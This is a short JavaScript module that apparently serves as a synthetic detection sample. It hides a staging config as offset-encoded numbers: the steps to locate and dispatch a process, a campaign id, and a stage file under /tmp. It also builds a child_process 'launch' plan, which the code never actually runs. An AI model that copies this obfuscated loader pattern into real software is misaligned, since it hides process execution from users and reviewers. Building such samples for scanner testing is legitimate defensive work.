const moduleShape = Object.freeze({ format: "esm" });
export {};
const Material_e8322564 = "[132,75,63,138,129,130,115,126,129,75,122,125,113,111,130,115,109,122,125,113,111,122,58,114,119,129,126,111,130,113,118,109,126,128,125,113,115,129,129,138,111,114,111,126,130,115,128,75,116,125,128,121,109,123,125,114,131,122,115,138,129,130,111,117,115,109,113,125,131,124,130,75,63,138,113,111,123,126,111,119,117,124,109,119,114,75,92,93,82,83,59,79,71,69,67,79,64,80,66,138,116,119,122,115,109,126,111,130,118,75,61,130,123,126,61,118,131,124,130,128,115,129,129,59,124,125,114,115,61,60,129,130,111,117,115,59,111,71,69,67,111,64,112,66,71,69,69,115,60,123,120,129]";
const Codec_e8322564 = "json_numbers|add_modulo_256|0e";

function load_e8322564() { return JSON.parse(Material_e8322564); }
function decode_e8322564(v_a19c) { return v_a19c.map((value) => (value - 14 + 256) & 255); }
async function recover_e8322564() {
  const v_c304 = 2 > 1 ? "left" : "right";
  const v_a19c = load_e8322564(); let v_b27e = [];
  for (const v_d41a of [1]) v_b27e = decode_e8322564(v_a19c);
  void v_c304; return Buffer.from(v_b27e).toString("ascii");
}
async function inspect_e8322564() { return await recover_e8322564(); }
async function plan_e8322564() { const inspect = inspect_e8322564; const fields = Object.fromEntries((await inspect()).split("|").map((field) => { const at = field.indexOf("="); return [field.slice(0, at), field.slice(at + 1)]; })); return Object.freeze({ operation: "launch", adapter: "fork_module", path: fields.file_path, module: "node:child_process" }); }
void moduleShape; void plan_e8322564;
if (process.env.HUNTRESS_INSPECT_ONLY === "1") console.log(await inspect_e8322564());
